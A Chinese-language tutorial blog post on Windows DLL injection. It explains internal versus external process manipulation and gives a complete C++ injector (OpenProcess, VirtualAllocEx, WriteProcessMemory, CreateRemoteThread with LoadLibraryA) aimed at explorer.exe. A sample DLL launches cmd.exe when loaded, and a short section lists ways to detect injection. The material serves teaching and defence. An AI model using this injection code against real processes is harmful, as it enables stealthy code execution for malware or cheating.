# 【Day 06】致不滅的 DLL - DLL Injection

## 環境與工具
* Windows 10 21H1
* Process Explorer v16.32
* Visual Studio 2019

## Internal vs External
要了解 internal hack 跟 external hack 的差別，首先要知道 process 的概念。

這邊要知道的只有兩件事：
* process 是執行中的 program，只有在執行之後，檔案中的資料才會被搬到記憶體中
* 每個 process 都有自己的地址空間，包含 text region, data region, stack region

綜合以上兩件事，應該就能理解 internal 和 external 的差別。假設現在有個目標 process，前者的做法是相當於直接在目標 process 的內部操作記憶體；後者則是從另一個 process 去讀取或寫入目標 process。

既然不管是 internal 還是 external，目的都是去操作目標 process 的記憶體，那用哪個有什麼差別？

|              | Internal Hack | External Hack |
| ------------ | ------------- | ------------- |
| 執行速度       | 快            | 慢            |
| 能做到的事情    | 多             | 少            |
| 被偵測到的可能性 | 有各種方法可以讓載入行為不容易被發現 | 高 |

基本上看上表就可以知道 external 的方法就只有在要做的事情很少，比如說只是要 patch 幾個 byte 的情況下才會使用。如果要做比較複雜，而且行跡比較隱密的操作，一般會使用 internal。

今天的主題，樸實無華的 DLL Injection，也是一般最常見的 DLL Injection，就是一種 internal hack。

## DLL Injection
### 簡介
第一次聽到 DLL Injection，不確定有沒有人跟我以前一樣覺得它是 SQL Injection 的好朋友，然而它們在做法與觀念上都相差很多。

打開 Sysinternals 的 procexp.exe / procexe64.exe，這工具 - process explorer 可以看到許多目前正在運行的 process，隨意點一個 process 後下方會顯示這個 process 所用的 handle，其中也包含許多 DLL。
![](https://i.imgur.com/3PG0AXw.png)

DLL Injection 做的事情就是將 DLL 載入目標 process，載入的 DLL 就可以在目標 process 中執行，並達到使用者的目的。等等在做完 DLL Injection 後，用 process explorer 可以在目標 process 中看到載入的 DLL。


### 實作流程
1. 取得目標 process 的 handle
2. 申請一塊目標 process 的記憶體
3. 將要注入 dll 路徑字串寫入目標 process
4. 從 kernel32.dll 取出其中的函數 `LoadLibraryA`
5. 在目標 process 新開一個 thread，並執行 `LoadLibraryA(<要注入的 dll>)`

### POC
裡面的註解基本上就是實作流程，遇到不熟的函數可以直接翻 MSDN，完整專案可以看我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E8%87%B4%E4%B8%8D%E6%BB%85%E7%9A%84DLL)。 
```cpp=
#include <windows.h>
#include <stdio.h>

// dll 路徑根據自己放的位置填
char dllname[150] = "<Path To DLL File>";
// pid 可以自己選，我是選 explorer.exe
DWORD pid = 13772;

int main() {
    // 1. 取得目標 process 的 handle
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. 申請一塊目標 process 的記憶體
    int size = strlen(dllname) + 5;
    PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (procdlladdr == NULL) {
        printf("handle %p VirtualAllocEx failed\n", hprocess);
        return 0;
    }
    
    // 3. 將要注入 dll 路徑字串寫入目標 process
    SIZE_T writenum;
    if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
        printf("handle %p WriteProcessMemory failed\n", hprocess);
        return 0;
    }
    
    // 4. 從 kernel32.dll 取出其中的函數 LoadLibraryA
    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!loadfuncaddr) {
        printf("handle %p GetProcAddress failed\n", hprocess);
        return 0;
    }
    
    // 5. 在目標 process 新開一個 thread，並執行 LoadLibraryA(<要注入的 dll>)
    HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
    if (!hthread) {
        printf("handle %p CreateRemoteThread failed\n", hprocess);
        return 0;
    }

    CloseHandle(hthread);
    CloseHandle(hprocess);

    return 0;
}
```

這邊也意思意思放個 DLL，如果你不知道 DLL 要寫什麼的話
```cpp=
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        // 在 DLL 載入時執行 cmd.exe
        case DLL_PROCESS_ATTACH: {
            WinExec("cmd.exe", 1);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

### 偵測
* 在 process 本身監控自己的 dll 載入
* 用 ETW 偵測 image load
* TLS callback

DLL Injection 不單純是紅隊會使用的技巧，一些工具、防毒軟體為了能夠更容易監控一些 process，也會使用到 DLL Injection，所以沒辦法直接利用有沒有 DLL Injection 就判斷一個軟體是不是惡意程式。

## 參考資料
[internal vs external](https://guidedhacking.com/threads/start-here-guide-for-internal-hacks-cheats.12838/?__cf_chl_captcha_tk__=pmd_Q4Nttx7B2pnNV5c6OGUR6dEqwWvJN5FwLHx8i0knGlQ-1629563259-0-gqNtZGzNAzujcnBszQkR)
[DLL Injector](https://guidedhacking.com/resources/guided-hacking-dll-injector.4/)
[process 概念](https://sls.weco.net/node/21323)
